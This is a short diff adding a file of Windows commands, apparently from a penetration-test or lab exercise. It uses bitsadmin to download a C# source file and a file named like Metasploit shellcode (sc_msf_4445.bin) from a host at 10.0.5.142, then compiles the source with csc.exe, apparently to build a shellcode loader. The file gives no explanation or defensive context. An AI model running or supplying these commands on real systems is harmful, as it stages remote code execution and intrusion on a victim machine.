@@ -1,0 +1,4 @@
+
+bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.5.142/Program.cs C:\Users\18520065\Desktop\Program.cs
+bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.5.142/sc_msf_4445.bin C:\Users\18520065\Desktop\sc_msf_4445.bin
+C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /t:exe /out:Program.exe Program.cs 
